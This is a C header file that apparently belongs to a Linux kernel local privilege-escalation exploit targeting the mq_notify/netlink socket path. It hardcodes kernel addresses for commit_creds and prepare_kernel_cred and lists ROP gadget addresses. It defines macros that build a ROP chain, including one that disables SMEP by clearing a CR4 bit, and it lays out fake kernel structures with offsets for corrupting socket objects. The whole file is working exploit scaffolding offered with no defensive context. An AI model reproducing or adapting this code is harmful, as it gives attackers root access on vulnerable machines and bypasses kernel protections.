#include <asm/types.h>

#define KMALLOC_TARGET          2048
#define UNBLOCKING_DELAY        2
#define FAKE_STACK_SIZE         500
#define NLK_PORTID_MAGIC_VALUE  0xCACABACA
#define PADDING_BYTE            0x41

#define MSG_KMALLOC_BUF_SIZE    (KMALLOC_TARGET-SIZEOF_STRUCT_MSG_MSG)
#define MSG_FILL_BUF_SIZE       212960
#define NOTIFY_COOKIE_LEN	    32
#define SOL_NETLINK             270

#define PAGE_SIZE               4096
#define THREAD_SIZE             (PAGE_SIZE << 2)

#define get_thread_info(thread_stack_addr) \
	((struct thread_info*)(thread_stack_addr & ~(THREAD_SIZE-1)))
#define get_current(thread_stack_addr)     \
	((struct task_struct*)(get_thread_info(thread_stack_addr)->task))


/* SYSCALLS */
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(sockfd, level, optname, optval, oplen) syscall(__NR_setsockopt, sockfd, level, optname, optval, oplen)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
#define _msgsnd(msgid, msgp, msgsz, msgflg) syscall(__NR_msgsnd, msgid, msgp, msgsz, msgflg)


/* GADGETS & FUNCTIONS */
typedef void (*panic_t)(const char *fmt, ...);
typedef int (*commit_creds_t)(void*);
typedef void* (*prepare_kernel_cred_t)(void*);
#define PANIC_ADDR                  ((void*)0xffffffff8150f03a)
#define COMMIT_CREDS_ADDR           ((void*)0xffffffff8108e4b0)
#define PREPARE_KERNEL_CRED_ADDR    ((void*)0xffffffff8108e780)
#define panic(...)                  (((panic_t)(PANIC_ADDR))(__VA_ARGS__))
#define commit_creds(creds)         (((commit_creds_t)(COMMIT_CREDS_ADDR))(creds))
#define prepare_kernel_cred(daemon) (((prepare_kernel_cred_t)(PREPARE_KERNEL_CRED_ADDR))(daemon))

#define POP_RSP              ((void*)0xffffffff81509241)
#define ADD_RSP_0x40         ((void*)0xffffffff81238f23)
#define XCHG_EAX_ESP         ((void*)0xffffffff81000099)
#define MOV_RAX_RBP_POP_RBP  ((void*)0xffffffff810167db)
#define MOV_RDX_RAX_JA       ((void*)0xffffffff812d9ed0)
#define MOV_EAX_INTO_RDI     ((void*)0xffffffff810d0d5a)
#define POP_RDI              ((void*)0xffffffff81002760)
#define SHR_RAX_32           ((void*)0xffffffff811b49e0)
#define MOV_RAX_RDX          ((void*)0xffffffff8100300c)
#define MOV_RAX_CR4          ((void*)0xffffffff81003050)
#define MOV_CR4_RDI          ((void*)0xffffffff81052b80)
#define AND_RAX_RDX          ((void*)0xffffffff8100bf55)
#define POP_RDX              ((void*)0xffffffff81095cc8)
#define TEST_R8_R8_JNE       ((void*)0xffffffff810dfbcc)
#define MOV_EDI_EAX_JNE_XOR_EAX_EAX_POP_RBX ((void*)0xffffffff8114563a)
#define JMP_RDI              ((void*)0xffffffff8103d26d)

#define STORE_EAX(addr)           \
	*stack++ = POP_RDI;           \
	*stack++ = (void*)addr;       \
	*stack++ = MOV_EAX_INTO_RDI;

#define MASK_CR4 (~((__uint64_t)(1 << 20)))

// this one assumes R8=0, couldn't find a cleaner way for moving eax to edi
#define DISABLE_SMEP()            \
	*stack++ = MOV_RAX_CR4;       \
	*stack++ = POP_RDX;           \
	*stack++ = (void*)MASK_CR4;   \
	*stack++ = AND_RAX_RDX;       \
	*stack++ = TEST_R8_R8_JNE;    \
	*stack++ = MOV_EDI_EAX_JNE_XOR_EAX_EAX_POP_RBX; \
	*stack++ = (void*)0x1234;     \
	*stack++ = MOV_CR4_RDI;


/* STRUCTURES */
#define SIZEOF_STRUCT_MSG_MSG  0x30
#define NLK_PORTID_OFFSET     0x2b0
#define NLK_GROUPS_OFFSET     0x2c8 
#define NLK_WAIT_OFFSET       0x2e0

struct list_head {
	struct list_head *next, *prev;
};

struct wait_queue_head {
	__u64 lock;
	struct list_head task_list;
};

/* Real wait_queue:
 *	struct wait_queue {
 *		unsigned int flags;
 *		void* private;
 *		void* func;
 *		struct list_head task_list;
 *	};
 *
 * As we don't use private, and we want flags
 * to be 8 bytes so we can place an address there,
 * we can simply modify the structure.
*/

struct wait_queue {
	void* flags;
	char pad[4];
	void* func;
	struct list_head task_list;
};

#define WQ_FLAG_EXCLUSIVE 0x01
#define WQ_FLAG_EXCLUSIVE_STR "1"
// doing stringification was ugly


#define TASK_STRUCT_FILES_OFFSET 0x5d8
#define FILES_STRUCT_FDT_OFFSET 0x8
#define FDTABLE_FD_OFFSET 0x8
#define FILE_PRIVATE_DATA_OFFSET 0xd0
#define SOCKET_SK_OFFSET 0x20

struct thread_info {
	struct stask_struct* task;
};

struct task_struct {
	char pad[TASK_STRUCT_FILES_OFFSET];
	struct files_struct* files;
};

struct files_struct {
	char pad[FILES_STRUCT_FDT_OFFSET];
	struct fdtable* fdt;
};

struct fdtable {
	char pad[FDTABLE_FD_OFFSET];
	struct file** fd;
};

struct file {
	char pad[FILE_PRIVATE_DATA_OFFSET];
	void* private_data;
};

struct socket {
	char pad[SOCKET_SK_OFFSET];
	void* sk;
};